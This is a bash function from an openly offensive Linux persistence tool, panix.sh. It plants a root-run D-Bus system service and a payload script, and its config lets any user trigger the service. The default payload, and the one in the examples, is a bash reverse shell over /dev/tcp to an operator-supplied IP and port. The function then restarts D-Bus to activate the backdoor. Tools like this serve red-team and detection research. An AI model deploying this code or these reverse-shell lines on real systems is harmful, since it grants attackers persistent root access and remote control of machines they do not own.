setup_dbus() {
	local default=0
	local custom=0
	local ip=""
	local port=""
	local payload=""

	# Check that the user is root.
	if ! check_root; then
		echo "Error: This function can only be run as root."
		exit 1
	fi

	# Check that D-Bus is installed by ensuring a key command exists.
	if ! command -v dbus-daemon &>/dev/null; then
		echo "Error: D-Bus does not appear to be installed or not in PATH."
		exit 1
	fi

	usage_dbus() {
		echo "Usage: ./panix.sh --dbus [OPTIONS]"
		echo "--examples                         Display command examples"
		echo "--default                          Use default reverse shell payload"
		echo "  --ip <ip>                          Specify IP address"
		echo "  --port <port>                      Specify port number"
		echo "--custom                           Use custom payload"
		echo "  --payload <payload>                Specify custom payload command"
		echo "--help|-h                          Show this help message"
	}

	while [[ "$1" != "" ]]; do
		case $1 in
			--default )
				default=1
				;;
			--custom )
				custom=1
				;;
			--ip )
				shift
				ip="$1"
				;;
			--port )
				shift
				port="$1"
				;;
			--payload )
				shift
				payload="$1"
				;;
			--examples )
				echo "Examples:"
				echo "--default:"
				echo "sudo ./panix.sh --dbus --default --ip 10.10.10.10 --port 1337"
				echo ""
				echo "--custom:"
				echo "sudo ./panix.sh --dbus --custom --payload 'bash -i >& /dev/tcp/10.10.10.10/1337 0>&1'"
				exit 0
				;;
			--help|-h )
				usage_dbus
				exit 0
				;;
			* )
				echo "Invalid option for --dbus: $1"
				echo "Try './panix.sh --dbus --help' for more information."
				exit 1
				;;
		esac
		shift
	done

	# Validate that exactly one of --default or --custom is provided.
	if [[ $default -eq 1 && $custom -eq 1 ]]; then
		echo "Error: --default and --custom cannot be specified together."
		echo "Try './panix.sh --dbus --help' for more information."
		exit 1
	fi

	if [[ $default -eq 0 && $custom -eq 0 ]]; then
		echo "Error: Either --default or --custom must be specified."
		echo "Try './panix.sh --dbus --help' for more information."
		exit 1
	fi

	# For --default, require --ip and --port.
	if [[ $default -eq 1 ]]; then
		if [[ -z $ip || -z $port ]]; then
			echo "Error: --ip and --port must be specified when using --default."
			echo "Try './panix.sh --dbus --help' for more information."
			exit 1
		fi
		payload="nohup setsid bash -c 'bash -i >& /dev/tcp/${ip}/${port} 0>&1' & disown"
	fi

	# For --custom, require --payload.
	if [[ $custom -eq 1 ]]; then
		if [[ -z $payload ]]; then
			echo "Error: --payload must be specified when using --custom."
			echo "Try './panix.sh --dbus --help' for more information."
			exit 1
		fi
	fi

	### 1. Create/Update the D-Bus service file.
	local service_file="/usr/share/dbus-1/system-services/org.panix.persistence.service"
	if [[ ! -d $(dirname "$service_file") ]]; then
		echo "Error: $(dirname "$service_file") does not exist. D-Bus may not be installed/configured."
		exit 1
	fi

	cat <<'EOF' > "$service_file"
[D-BUS Service]
Name=org.panix.persistence
Exec=/usr/local/bin/dbus-panix.sh
User=root
EOF
	echo "[+] Created/updated D-Bus service file: $service_file"

	### 2. Create/Update the payload script.
	local payload_script="/usr/local/bin/dbus-panix.sh"
	cat <<EOF > "$payload_script"
#!/bin/bash
# When D-Bus triggers this service, execute payload.
${payload}
EOF
	chmod +x "$payload_script"
	echo "[+] Created/updated payload script: $payload_script"

	### 3. Create/Update the D-Bus configuration file.
	local conf_file="/etc/dbus-1/system.d/org.panix.persistence.conf"
	if [[ ! -d $(dirname "$conf_file") ]]; then
		echo "Error: $(dirname "$conf_file") does not exist. D-Bus may not be installed/configured."
		exit 1
	fi

	cat <<'EOF' > "$conf_file"
<!DOCTYPE busconfig PUBLIC "-//freedesktop//DTD D-Bus Bus Configuration 1.0//EN"
	"http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">
<busconfig>
	<!-- Allow any user to own, send to, and access the specified service -->
	<policy context="default">
		<allow own="org.panix.persistence"/>
		<allow send_destination="org.panix.persistence"/>
		<allow send_interface="org.panix.persistence"/>
	</policy>
</busconfig>
EOF
	echo "[+] Created/updated D-Bus config file: $conf_file"

	### Final step: Restart D-Bus to apply changes.
	echo "[*] Restarting D-Bus..."
	systemctl restart dbus
	if [[ $? -eq 0 ]]; then
		echo "[+] D-Bus restarted successfully."
	else
		echo "[-] Failed to restart D-Bus. You may need to restart it manually."
	fi

	echo "[+] D-Bus persistence module completed. Test with:"
	echo "    dbus-send --system --type=method_call --dest=org.panix.persistence /org/panix/persistence org.panix.persistence.Method"
}
